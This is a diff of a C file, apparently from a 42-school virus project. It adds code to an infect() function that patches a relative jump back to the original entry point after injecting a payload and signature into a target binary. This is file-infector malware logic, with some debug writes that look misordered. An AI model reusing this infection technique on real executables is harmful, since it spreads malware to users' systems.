@@ -6,7 +6,7 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/05 17:56:55 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/05 18:16:41 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -66,6 +66,13 @@ bool	infect(profiling *this, const str path) {
 	ft_memcpy(file_origin + data.infection_offset + this->size + SIGNATURE_OFFSET, this->signature, SIGNATURE_LEN);
 	printf("Written %s at 0x%lx\n", file_origin + data.infection_offset + this->size + SIGNATURE_OFFSET,
 		data.infection_offset + this->size + SIGNATURE_OFFSET);
+
+	int	new_jump = 0 - (data.infection_offset + this->size) + data.original_entry_point + 12;
+
+
+	write(ret, 1, &new_jump, 4);
+	ft_memcpy(file_origin + data.infection_offset + this->size - 16, (byte *)&new_jump, 4);
+	write(ret, 1, file_origin + data.infection_offset + this->size - 16, 4);
 
 	// Logic ends
 	infect_end:
